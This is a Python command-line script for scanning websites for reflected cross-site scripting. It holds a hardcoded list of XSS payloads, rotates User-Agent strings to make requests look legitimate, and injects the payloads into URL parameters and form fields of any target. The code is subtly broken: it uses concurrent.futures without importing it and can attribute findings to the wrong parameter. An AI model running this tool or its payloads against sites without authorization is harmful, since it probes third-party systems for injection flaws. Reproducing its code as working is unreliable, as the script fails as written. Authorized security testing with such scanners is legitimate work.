import requests
import sys
import argparse
import time
import random
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urlparse, urlencode, parse_qs, urljoin
from bs4 import BeautifulSoup # For parsing HTML to find forms - install with: pip install beautifulsoup4
from colorama import Fore, Style, init

# Initialize Colorama for colored output
init(autoreset=True)

# List of common User-Agents for rotation to make requests appear more legitimate
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/109.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",
]

# Common XSS payloads
XSS_PAYLOADS = [
    "<script>alert(document.domain)</script>",
    "<img src=x onerror=alert(document.domain)>",
    "\"'();!--<XSS>=&{alert(document.domain)};",
    "';alert(document.domain)//",
    "<svg onload=alert(document.domain)>",
    "<body onload=alert(document.domain)>",
    "<iframe src=javascript:alert(document.domain)>",
    "<input onfocus=alert(document.domain) autofocus>",
    "<details open ontoggle=alert(document.domain)>",
    "<!--<script>alert(document.domain)</script>-->", # To break out of comments
    "`\"'><script>alert(document.domain)</script>",
    "';alert(String.fromCharCode(88,83,83))//", # ASCII encoded alert
    "<a href=\"javascript:alert(document.domain)\">XSS</a>",
    "<div style=\"width: expression(alert(document.domain));\">", # IE only, but good for testing
    "<%='%3E%3Cscript%3Ealert(document.domain)%3C/script%3E'%>" # Server-side template injection example
]

# A simpler, unique string to look for if the full payload gets encoded/modified
ALERT_STRING_TO_CHECK = "alert(document.domain)"

def get_random_user_agent():
    """Returns a random User-Agent string."""
    return random.choice(USER_AGENTS)

def print_banner():
    """Prints a professional ASCII art banner for the XSS scanner."""
    banner = f"""
{Fore.CYAN}{Style.BRIGHT}
 
▀▄▀ █▀ █▀   █▀ █▀▀ ▄▀█ █▄░█ █▄░█ █▀▀ █▀█
█░█ ▄█ ▄█   ▄█ █▄▄ █▀█ █░▀█ █░▀█ ██▄ █▀▄
       (XSS) Scanner V1.0
---------------------------------------------------
{Style.RESET_ALL}
"""
    print(banner)

def make_request(url, method='GET', data=None, params=None, timeout=10):
    """
    Helper function to make HTTP requests with random User-Agent.
    Returns the response object or None on error.
    """
    headers = {'User-Agent': get_random_user_agent()}
    try:
        if method.upper() == 'POST':
            response = requests.post(url, headers=headers, data=data, timeout=timeout)
        else: # Default to GET
            response = requests.get(url, headers=headers, params=params, timeout=timeout)
        return response
    except requests.exceptions.RequestException as e:
        # print(f"{Fore.RED}    [ERROR] Request to {url} failed: {e}{Style.RESET_ALL}")
        return None

def extract_forms(html_content, target_url):
    """
    Extracts all forms from HTML content and returns a list of dictionaries,
    each representing a form's action, method, and input fields.
    """
    soup = BeautifulSoup(html_content, 'html.parser')
    forms = []
    for form_tag in soup.find_all('form'):
        form_action = form_tag.get('action') or target_url
        form_method = form_tag.get('method', 'GET').upper()
        
        # Resolve relative URLs
        if not urlparse(form_action).netloc:
            form_action = urljoin(target_url, form_action)

        inputs = {}
        for input_tag in form_tag.find_all(['input', 'textarea', 'select']):
            input_name = input_tag.get('name')
            input_value = input_tag.get('value', '')
            # input_type = input_tag.get('type', 'text') # Not strictly needed for XSS payload injection
            
            if input_name:
                inputs[input_name] = input_value
        
        forms.append({'action': form_action, 'method': form_method, 'inputs': inputs})
    return forms

def check_for_xss_reflection(response_text, payload):
    """
    Checks if the payload (or a key part of it) is reflected in the response.
    This is a basic check and might miss sophisticated XSS.
    """
    # Check for direct reflection of the payload
    if payload.lower() in response_text.lower():
        return True
    
    # Check for the core JavaScript function if the HTML tags are stripped/encoded
    if ALERT_STRING_TO_CHECK.lower() in response_text.lower():
        return True

    return False

def scan_parameter(base_url, param_name, original_value, method, original_data, original_params, default_timeout=10):
    """
    Scans a single parameter for XSS vulnerabilities.
    Returns True if vulnerable, False otherwise.
    """
    
    print(f"{Fore.CYAN}    [+] Testing parameter '{param_name}' ({method}) with XSS payloads...{Style.RESET_ALL}")

    for payload in XSS_PAYLOADS:
        modified_value = original_value + payload
        
        response = None
        if method.upper() == 'GET':
            test_params = original_params.copy()
            test_params[param_name] = modified_value
            response = make_request(base_url, method='GET', params=test_params, timeout=default_timeout)
        else: # POST
            test_data = original_data.copy()
            test_data[param_name] = modified_value
            response = make_request(base_url, method='POST', data=test_data, timeout=default_timeout)
        
        if response and response.status_code == 200:
            if check_for_xss_reflection(response.text, payload):
                print(f"{Fore.RED}{Style.BRIGHT}        [!!! VULNERABLE - XSS Reflection !!!]{Style.RESET_ALL}")
                print(f"{Fore.RED}            Payload: '{payload}'{Style.RESET_ALL}")
                print(f"{Fore.RED}            Reflected in response.{Style.RESET_ALL}")
                return True, f"XSS found with payload: '{payload}' reflected in response."
        
        sys.stdout.write(f"\r        [*] Testing payload: '{payload[:50]}...' ")
        sys.stdout.flush()

    print(f"\r        {Fore.GREEN}[-] Parameter '{param_name}' seems NOT vulnerable to basic XSS payloads.{Style.RESET_ALL}")
    return False, "Not vulnerable to basic XSS"


def xss_scanner(target_url, http_method='GET', num_workers=5):
    """
    Main function to orchestrate the XSS scan.
    """
    vulnerabilities_found = []
    
    print(f"\n{Fore.BLUE}[+] Starting Cross-Site Scripting (XSS) Scan for {target_url} ({http_method})...{Style.RESET_ALL}")

    # For GET requests, parse URL parameters
    if http_method.upper() == 'GET':
        parsed_url = urlparse(target_url)
        query_params = parse_qs(parsed_url.query)
        
        if not query_params:
            print(f"{Fore.YELLOW}    No GET parameters found in the URL. Skipping GET scan.{Style.RESET_ALL}")
            return []
        
        print(f"{Fore.BLUE}    [+] Identified GET parameters: {', '.join(query_params.keys())}{Style.RESET_ALL}")

        param_tuples = [(name, values[0]) for name, values in query_params.items()] # Assume single value for now
        
        with ThreadPoolExecutor(max_workers=num_workers) as executor:
            futures = []
            for param_name, original_value in param_tuples:
                # Create original_params for each run
                current_params = query_params.copy()
                # Remove query string from base_url to add parameters later
                base_url_no_query = parsed_url.scheme + "://" + parsed_url.netloc + parsed_url.path
                
                futures.append(executor.submit(
                    scan_parameter,
                    base_url_no_query,
                    param_name,
                    original_value,
                    'GET',
                    None, # No data for GET
                    current_params
                ))
            
            for future in concurrent.futures.as_completed(futures):
                is_vuln, details = future.result()
                if is_vuln:
                    vulnerabilities_found.append(f"GET parameter '{param_name}' on {base_url_no_query}: {details}")

    # For POST requests, fetch the page to find forms
    elif http_method.upper() == 'POST':
        print(f"{Fore.BLUE}    [+] Fetching page to identify POST forms...{Style.RESET_ALL}")
        response = make_request(target_url, method='GET') # Fetch page to get forms
        if not response:
            print(f"{Fore.RED}    Error: Could not fetch target URL to find forms.{Style.RESET_ALL}")
            return []
        
        forms = extract_forms(response.text, target_url)
        if not forms:
            print(f"{Fore.YELLOW}    No POST forms found on {target_url}. Skipping POST scan.{Style.RESET_ALL}")
            return []

        for form in forms:
            if form['method'].upper() == 'POST':
                form_action = form['action']
                form_inputs = form['inputs']
                print(f"{Fore.BLUE}    [+] Identified POST form at '{form_action}' with parameters: {', '.join(form_inputs.keys())}{Style.RESET_ALL}")

                if not form_inputs:
                    print(f"{Fore.YELLOW}        Form has no input parameters. Skipping.{Style.RESET_ALL}")
                    continue

                param_tuples = [(name, value) for name, value in form_inputs.items()]

                with ThreadPoolExecutor(max_workers=num_workers) as executor:
                    futures = []
                    for param_name, original_value in param_tuples:
                        # Create original_data for each run
                        current_data = form_inputs.copy()
                        
                        futures.append(executor.submit(
                            scan_parameter,
                            form_action,
                            param_name,
                            original_value,
                            'POST',
                            current_data,
                            None # No params for POST
                        ))
                    
                    for future in concurrent.futures.as_completed(futures):
                        is_vuln, details = future.result()
                        if is_vuln:
                            vulnerabilities_found.append(f"POST parameter '{param_name}' in form on {form_action}: {details}")
            else:
                print(f"{Fore.YELLOW}    [WARNING] Form at '{form['action']}' is a GET form, not POST. Skipping.{Style.RESET_ALL}")

    print(f"\n{Fore.BLUE}--- XSS Scan Complete ---{Style.RESET_ALL}")
    if vulnerabilities_found:
        print(f"{Fore.RED}{Style.BRIGHT}!!! Found {len(vulnerabilities_found)} Potential XSS Vulnerabilities !!!{Style.RESET_ALL}")
        for vuln in vulnerabilities_found:
            print(f"{Fore.RED}    - {vuln}{Style.RESET_ALL}")
    else:
        print(f"{Fore.GREEN}No obvious XSS vulnerabilities found with basic payloads.{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Note: This does not guarantee full immunity. Advanced payloads may still exist.{Style.RESET_ALL}")
    
    print(f"{Fore.RED}Remember: This tool is for educational purposes only. Unauthorized scanning is illegal and unethical.{Style.RESET_ALL}")
    
    return vulnerabilities_found

if __name__ == "__main__":
    print_banner()

    parser = argparse.ArgumentParser(description="Cross-Site Scripting (XSS) Scanner - For Website Vulnerability Testing.")
    parser.add_argument("target_url", help="The target URL to scan (e.g., http://example.com/search.php?query=test or http://example.com/login.php for POST forms).")
    parser.add_argument("-m", "--method", type=str, default="GET", choices=["GET", "POST"],
                        help="HTTP method to use for scanning parameters (GET or POST, default: GET). For POST, the URL should be the form action URL.")
    parser.add_argument("-w", "--workers", type=int, default=5,
                        help="Number of concurrent workers (threads) for scanning parameters (default: 5).")
    # Custom payloads feature can be added here if needed, but for now, using hardcoded ones.

    args = parser.parse_args()

    # Basic URL validation
    parsed_url = urlparse(args.target_url)
    if not parsed_url.scheme or not parsed_url.netloc:
        print(f"{Fore.RED}Error: Invalid target URL. Please provide a full URL (e.g., http://example.com/page.php?name=test).{Style.RESET_ALL}")
        sys.exit(1)

    # Final confirmation before launching the scan
    print(f"\n{Fore.YELLOW}!!! WARNING: You are about to launch an XSS scan on {args.target_url} !!!{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}This can potentially expose client-side vulnerabilities. Proceed with caution.{Style.RESET_ALL}")
    confirmation = input(f"{Fore.YELLOW}Type 'YES' to confirm you understand the risks and have proper authorization: {Style.RESET_ALL}")

    if confirmation.upper() == 'YES':
        xss_scanner(args.target_url, args.method, num_workers=args.workers)
    else:
        print(f"{Fore.RED}Scan aborted. Please confirm by typing 'YES' if you wish to proceed.{Style.RESET_ALL}")
        sys.exit(0)
